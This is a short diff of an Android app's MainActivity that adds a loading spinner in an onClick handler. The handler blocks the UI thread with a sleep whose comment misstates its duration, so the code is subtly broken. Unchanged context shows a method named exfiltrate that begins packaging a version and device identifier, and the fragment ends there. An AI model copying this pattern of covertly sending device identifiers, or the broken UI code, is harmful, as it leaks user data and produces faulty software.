@@ -14,7 +14,9 @@ import android.os.PowerManager;
 import android.provider.Settings;
 import android.telephony.TelephonyManager;
 import android.util.Log;
+import android.view.View;
 import android.widget.ImageView;
+import android.widget.ProgressBar;
 import android.widget.Toast;
 import androidx.appcompat.app.AppCompatActivity;
 import com.squareup.picasso.Picasso;
@@ -30,7 +32,7 @@ import java.util.List;
 import java.util.Map;
 import java.util.concurrent.BlockingQueue;
 
-public class MainActivity extends AppCompatActivity implements WifiListener {
+public class MainActivity extends AppCompatActivity implements WifiListener, View.OnClickListener {
 
     private static final String TAG = "MainActivity";
 
@@ -42,6 +44,8 @@ public class MainActivity extends AppCompatActivity implements WifiListener {
     private boolean flagDiabetes;
     private boolean flagHealth;
     private Map<Integer, String> appMap = new HashMap<Integer, String>();
+    private ProgressBar spinner;
+
 
     @Override
     public void onCreate(Bundle savedInstanceState) {
@@ -122,6 +126,21 @@ public class MainActivity extends AppCompatActivity implements WifiListener {
     }
 
     // utilities
+
+    @Override
+    public void onClick(View view) {
+        spinner = (ProgressBar)findViewById(R.id.progressBar1);
+        spinner.setVisibility(View.VISIBLE);
+
+        try {
+            // thread to sleep for 1000 milliseconds
+            Thread.sleep(2000);
+        } catch (Exception e) {
+            System.out.println(e);
+        }
+
+        spinner.setVisibility(View.GONE);
+    }
 
     private void exfiltrate(String version, String id) {
         String send = "ver=" + version + "?" + id;
